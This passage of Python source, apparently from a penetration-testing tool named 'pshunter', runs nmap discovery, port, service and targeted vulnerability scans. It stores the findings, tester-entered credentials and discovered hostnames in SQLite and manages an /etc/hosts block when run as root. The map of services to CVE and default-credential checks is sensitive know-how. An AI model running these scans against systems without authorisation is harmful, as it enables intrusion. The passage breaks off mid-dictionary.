def fetch_ports(ip: str) -> list:
    """(port, proto, state) rows for a host, TCP first then UDP, ascending port."""
    rows = _fetch("SELECT port, proto, state FROM ports WHERE ip = ?", (ip,))
    return sorted(rows, key=lambda r: (r[1], r[0]))


def fetch_services(ip: str) -> dict:
    """{(port, proto): (name, product, version, cpe)} for a host."""
    rows = _fetch("SELECT port, proto, name, product, version, cpe FROM services WHERE ip = ?", (ip,))
    return {(p, pr): (n, prod, ver, cpe) for p, pr, n, prod, ver, cpe in rows}


def save_services(ip: str, rows: list, source: "str | None" = None) -> int:
    """Upsert probed service data (-sV) by (ip, port, proto), overwriting the earlier
    port-enum guess with the real name/product/version/cpe. ``source='manual'`` tags
    user-entered rows; a scanned upsert never clears an existing tag (COALESCE)."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                conn.execute(
                    "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                    "first_seen, last_seen, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                    "  name     = COALESCE(excluded.name, name), "
                    "  product  = COALESCE(excluded.product, product), "
                    "  version  = COALESCE(excluded.version, version), "
                    "  cpe      = COALESCE(excluded.cpe, cpe), "
                    "  last_seen = excluded.last_seen, "
                    "  source   = COALESCE(excluded.source, source)",
                    (ip, r["port"], r["proto"], r.get("name"), r.get("product"),
                     r.get("version"), r.get("cpe"), now, now, source),
                )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


def save_scripts(ip: str, rows: list) -> int:
    """Upsert NSE script output by (ip, port, proto, script) — port 0 = host-level —
    and, in the same transaction, extract any finding from each script into the vulns
    table (so both -sC and vuln-scan output feed the findings summary, no re-scan)."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                sid = r.get("id")
                if not sid:
                    continue
                port, proto, output = int(r.get("port") or 0), r.get("proto") or "", r.get("output")
                conn.execute(
                    "INSERT INTO scripts (ip, port, proto, script, output, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto, script) DO UPDATE SET "
                    "  output = excluded.output, last_seen = excluded.last_seen",
                    (ip, port, proto, sid, output, now, now),
                )
                f = _extract_finding(sid, output or "")
                if f:
                    conn.execute(
                        "INSERT INTO vulns (ip, port, proto, script, state, cve, risk, summary, "
                        "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                        "ON CONFLICT(ip, port, proto, script) DO UPDATE SET "
                        "  state = excluded.state, cve = excluded.cve, risk = excluded.risk, "
                        "  summary = excluded.summary, last_seen = excluded.last_seen",
                        (ip, port, proto, sid, f["state"], f["cve"], f["risk"], f["summary"], now, now),
                    )
                for hn in _extract_hostnames(ip, sid, output or ""):     # cert SANs, redirects, SMB FQDN
                    conn.execute(
                        "INSERT INTO hostnames (ip, port, hostname, source, first_seen, last_seen) "
                        "VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(ip, hostname) DO UPDATE SET "
                        "  last_seen = excluded.last_seen",
                        (ip, port, hn, sid, now, now),
                    )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


# a plausible DNS hostname (has a dot, valid label chars, not a bare IP)
_HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)([a-z0-9_](?:[a-z0-9_-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$")


def _valid_hostname(name: str, ip: str) -> "str | None":
    """Normalise & validate a candidate hostname; None if it isn't a usable DNS name."""
    n = (name or "").strip().lower().rstrip(".")
    if n.startswith("*."):                       # wildcard cert → keep the base domain
        n = n[2:]
    if not n or n == ip:
        return None
    if _HOSTNAME_RE.match(n) and not n.replace(".", "").isdigit():
        return n
    return None


def _extract_hostnames(ip: str, sid: str, output: str) -> set:
    """Pull DNS names out of one NSE script's output — TLS cert CN/SAN (ssl-cert), HTTP
    redirect targets (http-title/http-*), and SMB FQDN/domain (smb-os-discovery). These
    domains/vhosts are gold for phase 5 (add to /etc/hosts, vhost-fuzz)."""
    if not output:
        return set()
    cands = []
    if "ssl-cert" in sid or "ssl-" in sid:
        cands += re.findall(r"DNS:([A-Za-z0-9_.*-]+)", output)
        cands += re.findall(r"(?:commonName|CN)=([A-Za-z0-9_.*-]+)", output)
    if sid == "vhost-fuzz":                       # our sweep marks hits with "  + <host>"
        cands += re.findall(r"^\s*\+ ([A-Za-z0-9_.-]+)", output, re.M)
    if sid.startswith("http-"):
        cands += re.findall(r"redirect to https?://([A-Za-z0-9_.-]+)", output, re.I)
        cands += re.findall(r"[Ll]ocation:\s*https?://([A-Za-z0-9_.-]+)", output)
    if sid == "smb-os-discovery":
        for pat in (r"FQDN:\s*(\S+)", r"Domain name:\s*(\S+)", r"DNS_?[Dd]omain[_ ]?[Nn]ame:\s*(\S+)",
                    r"Forest name:\s*(\S+)"):
            cands += re.findall(pat, output)
    if sid == "smb-enum":                         # our report header: 'Host: X   OS: …   Domain: Y'
        dom = re.search(r"Domain:\s*(\S+)", output)
        host = re.search(r"Host:\s*(\S+)", output)
        if dom:
            cands.append(dom.group(1))
            if host and host.group(1) not in ("?", ""):
                cands.append(f"{host.group(1)}.{dom.group(1)}")
    return {h for h in (_valid_hostname(c, ip) for c in cands) if h}


def save_hostnames(ip: str, entries: list) -> None:
    """Store validated DNS names for a host (dedup by (ip, hostname)). ``entries`` is a
    list of {'port', 'hostname', 'source'} — e.g. nmap's per-service resolved name."""
    if not ip or not entries or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for e in entries:
                hn = _valid_hostname(e.get("hostname"), ip)
                if not hn:
                    continue
                conn.execute(
                    "INSERT INTO hostnames (ip, port, hostname, source, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(ip, hostname) DO UPDATE SET "
                    "  last_seen = excluded.last_seen",
                    (ip, int(e.get("port") or 0), hn, e.get("source") or "service", now, now))
            conn.commit()
        finally:
            conn.close()
    _sync_hosts_block(ip)             # keep the managed /etc/hosts block current (root only)


def fetch_hostnames(ip: str) -> list:
    """(hostname, port, source) DNS names discovered for a host, for phase-5 vhost work."""
    rows = _fetch("SELECT hostname, port, source FROM hostnames WHERE ip = ? ORDER BY hostname", (ip,))
    return rows


# ── manual findings (user-entered) ────────────────────────────────────────────
# The scanner only records what it saw; a tester often knows more — a port behind a
# knock, a vhost from a report, creds from another box, a page found by hand. These
# helpers top up the DB so the downstream scans/tools pick the extra surface up.
# Hosts/ports/services/hostnames reuse the normal save_* upserts. Creds and paths are
# stored as synthetic script rows (`manual-creds` / `manual-paths`) in the exact line
# format their consumers already parse, so a tool only needs the new sid added next to
# default-creds / dir-brute — no new source of truth.

def _load_manual_block(ip: str, port: int, proto: str, sid: str) -> dict:
    """Parse an existing manual script row into {host: [lines]} (order preserved)."""
    blocks, host = {}, None
    for s, output in fetch_scripts(ip, port, proto):
        if s != sid:
            continue
        for ln in (output or "").splitlines():
            mh = re.match(r"^\[([^\]\s]+)\]\s*$", ln)
            if mh:
                host = mh.group(1)
                blocks.setdefault(host, [])
            elif ln.strip() and host is not None:
                blocks[host].append(ln)
    return blocks


def _save_manual_block(ip: str, port: int, proto: str, sid: str, blocks: dict) -> None:
    """Re-render {host: [lines]} to a `[host]`-sectioned body and upsert the script row."""
    lines = []
    for host, entries in blocks.items():
        if not entries:
            continue
        lines.append(f"[{host}]")
        lines.extend(entries)
    save_scripts(ip, [{"id": sid, "port": port, "proto": proto, "output": "\n".join(lines)}])


def add_manual_path(ip: str, port: int, proto: str, host: str, path: str) -> None:
    """Record a user-found path/page under `manual-paths` in dir-brute's `+ 200 /path`
    format so every path-gathering tool (param/idor/upload/xxe/priv) surfaces it."""
    blocks = _load_manual_block(ip, port, proto, "manual-paths")
    entries = blocks.setdefault(host, [])
    line = f"+ 200  {path}"
    if line not in entries:
        entries.append(line)
    _save_manual_block(ip, port, proto, "manual-paths", blocks)


def add_manual_cred(ip: str, port: int, proto: str, host: str, user: str,
                    pw: str, path: str, kind: str) -> None:
    """Record user-supplied valid credentials under `manual-creds` in default-creds'
    `! user:pass @ /path (form) [host]` format so admin-rce / idor / foothold reuse them."""
    blocks = _load_manual_block(ip, port, proto, "manual-creds")
    entries = blocks.setdefault(host, [])
    line = f"! {user}:{pw or '<blank>'} @ {path} ({kind}) [{host}]"
    if line not in entries:
        entries.append(line)
    _save_manual_block(ip, port, proto, "manual-creds", blocks)


def fetch_manual(ip: str) -> list:
    """(port, proto, sid, output) rows the user entered by hand (creds + paths)."""
    return _fetch("SELECT port, proto, script, output FROM scripts WHERE ip = ? "
                  "AND script IN ('manual-paths', 'manual-creds') ORDER BY port, script", (ip,))


# ── managed /etc/hosts block ──────────────────────────────────────────────────
# Discovered vhosts are useless in a browser / name-based tools until they resolve, and
# the only OS-wide way to do that is /etc/hosts (glibc reads it hard-coded; no alternate
# file, no include). So — WHEN RUNNING AS ROOT — we maintain one marked block per target
# IP, rebuilt from the DB. The block is treated as EPHEMERAL session state: it is stripped
# on startup (surviving a crash / SIGKILL / terminal close, unlike an exit-only hook — the
# same reasoning as _chown_db_to_user) and best-effort removed again at exit. Without root
# we never touch the file; the user gets a paste-ready line instead.
HOSTS_PATH = "/etc/hosts"
_HOSTS_LOCK = threading.Lock()
_HOSTS_LEDGER = os.path.join(os.path.dirname(DB_PATH), "hosts_ledger.json")
_HOSTS_BLOCK_RE = re.compile(
    r"\n?# >>> pshunter (?P<ip>\S+) >>>\n.*?\n# <<< pshunter (?P=ip) <<<\n?", re.S)


def _read_hosts() -> str:
    with open(HOSTS_PATH, encoding="utf-8", errors="replace") as fh:
        return fh.read()


def _write_hosts(text: str) -> None:
    """Atomically replace /etc/hosts (temp in the same dir → os.replace). Needs root."""
    d = os.path.dirname(HOSTS_PATH) or "/"
    fd, tmp = tempfile.mkstemp(prefix=".pshunter-hosts-", dir=d)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(text)
        os.replace(tmp, HOSTS_PATH)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def _strip_pshunter_blocks(text: str, ip: "str | None" = None) -> str:
    """Remove our marked block(s) — one IP's, or all of them if ip is None."""
    if ip is None:
        return _HOSTS_BLOCK_RE.sub("\n", text)
    pat = re.compile(
        rf"\n?# >>> pshunter {re.escape(ip)} >>>\n.*?\n# <<< pshunter {re.escape(ip)} <<<\n?", re.S)
    return pat.sub("\n", text)


def _ledger_load() -> list:
    try:
        with open(_HOSTS_LEDGER, encoding="utf-8") as fh:
            data = json.load(fh)
        return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _ledger_save(ips: list) -> None:
    try:
        with open(_HOSTS_LEDGER, "w", encoding="utf-8") as fh:
            json.dump(sorted(set(ips)), fh)
    except OSError:
        pass


def _hosts_snippet(ip: str) -> "str | None":
    """A ready-to-paste one-liner adding all of an IP's discovered names in one go."""
    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    if not names:
        return None
    return f"sudo sh -c 'echo \"{ip}  {' '.join(names)}\" >> /etc/hosts'"


def _sync_hosts_block(ip: str) -> None:
    """Rebuild the managed /etc/hosts block for one IP from the DB. Root only; silent
    no-op otherwise (the launch notice / findings snippet tell the user what to do)."""
    if not ip or _is_self_ip(ip) or not _is_root():
        return
    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    with _HOSTS_LOCK:
        try:
            text = _read_hosts()
        except OSError:
            return
        new = _strip_pshunter_blocks(text, ip)
        if names:
            if not new.endswith("\n"):
                new += "\n"
            new += (f"# >>> pshunter {ip} >>>\n{ip}  {' '.join(names)}\n"
                    f"# <<< pshunter {ip} <<<\n")
        if new != text:
            try:
                _write_hosts(new)
            except OSError:
                return
        led = _ledger_load()
        if names and ip not in led:
            _ledger_save(led + [ip])
        elif not names and ip in led:
            _ledger_save([x for x in led if x != ip])


def _remove_all_pshunter_hosts() -> None:
    """Strip every managed block — used for startup reconciliation and the atexit hook."""
    if not _is_root():
        return
    with _HOSTS_LOCK:
        try:
            text = _read_hosts()
        except OSError:
            return
        new = _strip_pshunter_blocks(text)
        if new != text:
            try:
                _write_hosts(new)
            except OSError:
                pass
    _ledger_save([])


def _reconcile_hosts_on_start() -> None:
    """Clear any residue from a previous (possibly crashed) session. As root we strip it;
    without root we can't write the file, so we just point out the leftovers + the fix."""
    if _is_root():
        _remove_all_pshunter_hosts()
        return
    try:
        text = _read_hosts()
    except OSError:
        return
    if "# >>> pshunter " in text:
        print(f"{YELLOW}⚠ leftover pshunter /etc/hosts entries from a previous session{RESET} "
              f"{DIM}— clean with: sudo sed -i '/# >>> pshunter/,/# <<< pshunter/d' /etc/hosts{RESET}")


def save_os(ip: str, os_name: str) -> None:
    """Store the detected OS on the host row (overwrites a previous guess)."""
    if not ip or not os_name or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(
                "INSERT INTO hosts (ip, os, first_seen, last_seen) VALUES (?, ?, ?, ?) "
                "ON CONFLICT(ip) DO UPDATE SET os = excluded.os, last_seen = excluded.last_seen",
                (ip, os_name, now, now))
            conn.commit()
        finally:
            conn.close()


def fetch_host_os(ip: str) -> "str | None":
    rows = _fetch("SELECT os FROM hosts WHERE ip = ?", (ip,))
    return rows[0][0] if rows and rows[0][0] else None


def fetch_scripts(ip: str, port: int, proto: str) -> list:
    """(script, output) rows for one port (proto '' + port 0 = host-level scripts)."""
    return _fetch("SELECT script, output FROM scripts WHERE ip = ? AND port = ? AND proto = ?",
                  (ip, port, proto))


def fetch_scripted_ports(ip: str) -> set:
    """{(port, proto)} that carry per-port NSE script output — i.e. the ports where
    there's more to see (from service detection / vuln scan)."""
    rows = _fetch("SELECT DISTINCT port, proto FROM scripts WHERE ip = ? AND port != 0", (ip,))
    return {(p, pr) for p, pr in rows}


def fetch_vulns(ip: str) -> list:
    """(port, proto, script, state, cve, risk, summary) findings for a host."""
    rows = _fetch("SELECT port, proto, script, state, cve, risk, summary FROM vulns WHERE ip = ?", (ip,))
    return sorted(rows, key=lambda r: (r[0], r[2]))


def fetch_step_status(ip: str, port: int, proto: str, service: str) -> dict:
    """{step_index: status} for one service's checklist on a host ('done' / 'skip')."""
    rows = _fetch("SELECT step, status FROM exploit_steps WHERE ip = ? AND port = ? "
                  "AND proto = ? AND service = ?", (ip, port, proto, service))
    return {step: status for step, status in rows}


def set_step_status(ip: str, port: int, proto: str, service: str, step: int,
                    status: "str | None") -> None:
    """Persist one checklist step's status; status None clears it back to 'to-do'."""
    if not ip or _is_self_ip(ip):
        return
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            if status is None:
                conn.execute("DELETE FROM exploit_steps WHERE ip = ? AND port = ? AND "
                             "proto = ? AND service = ? AND step = ?",
                             (ip, port, proto, service, step))
            else:
                conn.execute(
                    "INSERT INTO exploit_steps (ip, port, proto, service, step, status, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto, service, step) DO UPDATE SET "
                    "  status = excluded.status, last_seen = excluded.last_seen",
                    (ip, port, proto, service, step, status, now))
            conn.commit()
        finally:
            conn.close()


# ── background jobs (feed [s] status) ─────────────────────────────────────────
_JOBS: list = []
_JOBS_LOCK = threading.Lock()


# ── job persistence (status history survives across app restarts) ─────────────
def _job_insert(job: dict) -> None:
    """Insert a new job row and stash its rowid on the job for later updates."""
    with _DB_LOCK:
        conn = _db_connect()
        try:
            cur = conn.execute(
                "INSERT INTO jobs (created, phase, name, command, state, hosts, error, output, run) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (job["created"], job["phase"], job["name"], job["command"],
                 job["state"], job["hosts"], job["error"], job["output"], job.get("run")))
            job["db_id"] = cur.lastrowid
            conn.commit()
        finally:
            conn.close()


def _job_update(job: dict) -> None:
    """Persist the job's current state / host count / error / captured output."""
    if job.get("db_id") is None:
        return
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(
                "UPDATE jobs SET state = ?, hosts = ?, error = ?, output = ? WHERE id = ?",
                (job["state"], job["hosts"], job["error"], job["output"], job["db_id"]))
            conn.commit()
        finally:
            conn.close()


def _load_jobs() -> None:
    """Reload the saved command history into _JOBS at startup. A job left 'running'
    from a previous session is no longer alive, so it is loaded (and persisted) as
    'aborted'."""
    if not os.path.exists(DB_PATH):
        return
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        rows = conn.execute("SELECT id, created, phase, name, command, state, hosts, "
                            "error, output, run FROM jobs ORDER BY id").fetchall()
    except sqlite3.OperationalError:      # jobs table not created yet
        return
    finally:
        conn.close()
    corrected = []
    with _JOBS_LOCK:
        _JOBS.clear()
        for jid, created, phase, name, command, state, hosts, error, output, run in rows:
            st = "aborted" if state == "running" else state
            job = {"db_id": jid, "created": created, "phase": phase, "name": name,
                   "command": command, "state": st, "hosts": hosts or 0,
                   "found": set(), "error": error, "output": output,
                   "run": run or f"job{jid}",    # pre-run-column jobs group as singletons
                   "cancel": threading.Event()}
            _JOBS.append(job)
            if st != state:
                corrected.append(job)
    for job in corrected:                 # write back the running->aborted fix
        _job_update(job)


def _next_run_id() -> str:
    """A unique id for one phase execution (the batch of commands launched together).
    Time-based so it never collides with a run id reloaded from a previous session."""
    return str(time.time_ns())


def _new_job(phase: str, name: str, command: str, run: "str | None" = None) -> dict:
    # each phase execution shares one run id so status can group its commands; a job with
    # no explicit run (single-command phases) gets its own, i.e. its own status entry.
    job = {
        "phase": phase, "name": name, "command": command, "run": run or _next_run_id(),
        "state": "running", "hosts": 0, "found": set(), "error": None, "output": None,
        "cancel": threading.Event(),
        "created": datetime.now().isoformat(timespec="seconds"), "db_id": None,
    }
    _job_insert(job)                      # assigns job["db_id"]
    with _JOBS_LOCK:
        _JOBS.append(job)
    return job


def _run_pass(job: dict, args: list, targets: list, deadline: float) -> None:
    """Run one nmap pass, streaming live hosts to the DB and the job's found set.
    Honours job['cancel'] so status can abort a running scan. The job's state, host
    count and captured console output are persisted (output feeds the report view)."""
    def _on_hosts(batch):
        live = [h for h in batch if not _is_self_ip(h["ip"])]
        if live:
            save_hosts(live)
            job["found"].update(h["ip"] for h in live)
            job["hosts"] = len(job["found"])
            _job_update(job)
    try:
        hosts, output = _run_nmap(args, targets, _on_hosts, deadline=deadline,
                                  should_stop=job["cancel"].is_set)
        job["output"] = output
        if hosts is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_discovery(parsed: dict, minutes: int) -> None:
    """Fast and thorough passes run concurrently; their results are unioned into the
    DB. The whole phase shares one time budget — each pass is hard-capped at the full
    budget (not a split), so both may use all the minutes the user allowed."""
    _refresh_own_addresses()          # pick up any IP change since the last scan
    targets = parsed["targets"]
    deadline = max(1, minutes * 60)
    name = _PHASES["0"][0]
    run = _next_run_id()
    threads = []
    for args in (_DISCOVERY_FAST, _DISCOVERY_SLOW):
        command = " ".join(["nmap"] + args + targets)
        job = _new_job("0", name, command, run)
        t = threading.Thread(target=_run_pass, args=(job, args, targets, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_discovery(parsed: dict, minutes: int) -> None:
    """Launch discovery (both passes) in the background; the menu stays free."""
    threading.Thread(target=_run_discovery, args=(parsed, minutes), daemon=True).start()


# ── port enumeration (phase 2) ────────────────────────────────────────────────
# Runs several nmap port scans concurrently on one host, streaming open ports to the
# DB. A fast top-1000 (T4) gives an immediate working set; the full 65535-port TCP
# sweep is split into two halves at T3 (reliability over speed — completeness matters
# and T4 can miss ports on rate-limited/laggy targets); a top-100 UDP scan (root only)
# covers the common UDP services. -sV/-sC are deliberately left to the service phase.
def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


def _port_scan_specs() -> list:
    """(label, nmap-args) for the concurrent port scans. SYN scan needs root; fall
    back to a TCP connect scan otherwise. UDP is added only when root."""
    tcp = "-sS" if _is_root() else "-sT"
    specs = [
        ("fast",    [tcp, "-Pn", "-n", "--open", "-T4", "--top-ports", "1000"]),
        ("full-lo", [tcp, "-Pn", "-n", "--open", "-T3", "-p", "1-32767"]),
        ("full-hi", [tcp, "-Pn", "-n", "--open", "-T3", "-p", "32768-65535"]),
    ]
    if _is_root():
        specs.append(("udp", ["-sU", "-Pn", "-n", "--open", "-T4", "--top-ports", "100"]))
    return specs


def _run_port_pass(job: dict, args: list, ip: str, deadline: float) -> None:
    """Run one port scan on ``ip``, streaming open ports (and any service guess) to the
    DB. Honours job['cancel']; persists state, port count and captured output."""
    found = set()

    def _on_items(batch):
        for h in batch:
            rows = h.get("ports")
            if rows and not _is_self_ip(h["ip"]):
                save_ports(h["ip"], rows)
                found.update((r["port"], r["proto"]) for r in rows)
                job["hosts"] = len(found)
                _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_ports_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_port_enum(ip: str, minutes: int) -> None:
    """Concurrent port scans on one host, sharing one time budget (each capped at the
    full budget). The fast scan lands ports early while the full/UDP scans finish."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])          # make sure the target shows in the hosts list
    deadline = max(1, minutes * 60)
    name = _PHASES["1"][0]
    run = _next_run_id()
    threads = []
    for _label, args in _port_scan_specs():
        command = " ".join(["nmap"] + args + [ip])
        job = _new_job("1", name, command, run)
        t = threading.Thread(target=_run_port_pass, args=(job, args, ip, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_port_enum(ip: str, minutes: int) -> None:
    """Launch port enumeration in the background; the menu stays free."""
    threading.Thread(target=_run_port_enum, args=(ip, minutes), daemon=True).start()


# ── service detection (phase 3) ───────────────────────────────────────────────
# Deep identification on the open ports from phase 2: -sV probes real versions and
# -sC runs the default NSE scripts (titles, certs, SMB/SSH/HTTP info) — the payload
# of this phase. OS detection runs as its OWN scan (`-O --osscan-guess`, root only)
# because -O needs an open AND a closed port, so it must not be pinned to the open-
# port list (that yields nmap's "OS detection unreliable" warning). -A is avoided for
# the same reason (its bundled -O would be unreliable) plus its traceroute noise.
def _service_scan_specs(ip: str) -> list:
    """(label, nmap-args) for service detection on ``ip``'s known-open ports. TCP gets
    -sV -sC; UDP (root) gets -sU -sV; OS (root) gets its own unrestricted -O scan."""
    ports = fetch_ports(ip)
    tcp = [str(p) for p, proto, _s in ports if proto == "tcp"]
    udp = [str(p) for p, proto, _s in ports if proto == "udp"]
    specs = []
    if tcp:
        specs.append(("service", ["-sV", "-sC", "-Pn", "-n", "-T4", "-p", ",".join(tcp)]))
    if udp and _is_root():
        specs.append(("service-udp", ["-sU", "-sV", "-Pn", "-n", "-T4", "-p", ",".join(udp)]))
    if _is_root():
        specs.append(("os", ["-O", "--osscan-guess", "-Pn", "-n", "-T4"]))
    return specs


def _run_service_pass(job: dict, args: list, ip: str, deadline: float) -> None:
    """Run one service-detection scan, streaming probed services / NSE output / OS to
    the DB. Honours job['cancel']; persists progress and captured output."""
    counter = [0]

    def _on_items(batch):
        for h in batch:
            if _is_self_ip(h["ip"]):
                continue
            svc, scr, os_name = h.get("services") or [], h.get("scripts") or [], h.get("os")
            if svc:
                save_services(h["ip"], svc)
            if scr:
                save_scripts(h["ip"], scr)            # also extracts cert/redirect/SMB hostnames
            if h.get("hostnames"):
                save_hostnames(h["ip"], h["hostnames"])
            if os_name:
                save_os(h["ip"], os_name)
            counter[0] += len(svc) + len(scr) + (1 if os_name else 0)
            job["hosts"] = counter[0]
            _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_detail_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_service_detection(ip: str, minutes: int) -> None:
    """Concurrent service-detection scans on one host, sharing one time budget."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])
    deadline = max(1, minutes * 60)
    name = _PHASES["2"][0]
    run = _next_run_id()
    threads = []
    for _label, args in _service_scan_specs(ip):
        command = " ".join(["nmap"] + args + [ip])
        job = _new_job("2", name, command, run)
        t = threading.Thread(target=_run_service_pass, args=(job, args, ip, deadline), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_service_detection(ip: str, minutes: int) -> None:
    """Launch service detection in the background; the menu stays free."""
    threading.Thread(target=_run_service_detection, args=(ip, minutes), daemon=True).start()


# ── vuln scan (phase 4) ───────────────────────────────────────────────────────
# Targeted NSE, driven by the services already in the DB — not a blind --script vuln.
# For each open port we look up its service and fire only the relevant checks: active
# CVE tests (vuln category) plus auth-weakness checks (anonymous / empty / default
# creds — the auth category, never brute). All script names are verified to ship with
# nmap. brute / dos / exploit are excluded; rdp-vuln-ms12-020 (can crash a host) is
# left out by default. SSL scripts run on any TLS-wrapped port. Findings in the
# standard NSE `vuln` format (State: VULNERABLE) are parsed into the vulns table.
_SSL = "ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params"
_VULN_SCRIPTS = {
    "microsoft-ds": "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-vuln-ms10-061,smb-vuln-cve2009-3103,smb-double-pulsar-backdoor,"
                    "smb-security-mode,smb2-security-mode,smb-enum-users",
    "netbios-ssn":  "smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,"
                    "smb-security-mode,smb-enum-users",
    "http":         "http-shellshock,http-vuln-cve2017-5638,http-vuln-cve2015-1635,"
                    "http-vuln-cve2014-3704,http-vuln-cve2012-1823,http-vuln-cve2017-1001000,"
                    "http-vuln-misfortune-cookie,http-default-accounts,http-auth-finder,"
                    "http-config-backup,http-git,http-webdav-scan",
    "ms-wbt-server": "rdp-ntlm-info",
    "ftp":          "ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-anon",
    "ssh":          "ssh-auth-methods,ssh-publickey-acceptance",
    "telnet":       "telnet-encryption",
    "smtp":         "smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764",
    "mysql":        "mysql-vuln-cve2012-2122,mysql-empty-password",
    "ms-sql":       "ms-sql-empty-password",
    "oracle":       "oracle-enum-users",
    "mongodb":      "mongodb-databases",
    "redis":        "redis-info",
    "vnc":          "realvnc-auth-bypass,vnc-info,vnc-title",
    "snmp":         "snmp-info",
    "x11":          "x11-access",
    "rmi":          "rmi-vuln-classloader",
    "rsync":        "rsync-list-modules",
    "distcc":       "distcc-cve2004-2687",
    "clamav":       "clamav-exec",
    "irc":          "irc-unrealircd-backdoor",
}
_VULN_PORT_FALLBACK = {
    445: "microsoft-ds", 139: "netbios-ssn", 80: "http", 443: "http", 8080: "http",
    8443: "http", 3389: "ms-wbt-server", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    465: "smtp", 587: "smtp", 3306: "mysql", 1433: "ms-sql", 1521: "oracle",
    27017: "mongodb", 6379: "redis", 5900: "vnc", 161: "snmp", 1099: "rmi", 873: "rsync",
    3632: "distcc", 3310: "clamav", 6667: "irc", 6000: "x11", 6001: "x11",
}
_TLS_PORTS = {443, 465, 563, 636, 853, 990, 992, 993, 995, 8443}
# auth-category scripts that only emit output when they actually find a weakness, so
# any output is a finding (anonymous / empty / default creds, unauth access).
_AUTH_FINDING = {"ftp-anon", "mysql-empty-password", "ms-sql-empty-password",
                 "http-default-accounts", "x11-access", "redis-info",
                 "mongodb-databases", "rsync-list-modules", "snmp-info"}


def _vuln_key(name: "str | None", port: int) -> "str | None":
    if name:
        low = name.lower()
        for key in _VULN_SCRIPTS:
            if key in low:
                return key
    return _VULN_PORT_FALLBACK.get(port)


def _vuln_families(ip: str) -> list:
    """Group the host's open ports into (label, scripts, [ports]) families so each
    family runs one targeted scan. SSL scripts are added for TLS-wrapped ports."""
    services = fetch_services(ip)
    groups: dict = {}    # key -> [scripts, set(ports)]
    for port, proto, _state in fetch_ports(ip):
        name = (services.get((port, proto)) or (None, None, None))[0]
        key = _vuln_key(name, port)
        if key:
            groups.setdefault(key, [_VULN_SCRIPTS[key], set()])[1].add(port)
        low = (name or "").lower()
        if port in _TLS_PORTS or "ssl" in low or "https" in low or "tls" in low:
            groups.setdefault("ssl", [_SSL, set()])[1].add(port)
    return [(k, sc, sorted(ps)) for k, (sc, ps) in groups.items() if ps]


# Auth-category scripts whose mere output is a weakness → a one-line title each.
_AUTH_TITLE = {
    "ftp-anon": "anonymous FTP login allowed",
    "mysql-empty-password": "MySQL account with empty password",
    "ms-sql-empty-password": "MSSQL account with empty password",
    "http-default-accounts": "default web credentials found",
    "x11-access": "X11 server open (no auth)",
    "redis-info": "Redis reachable without auth",
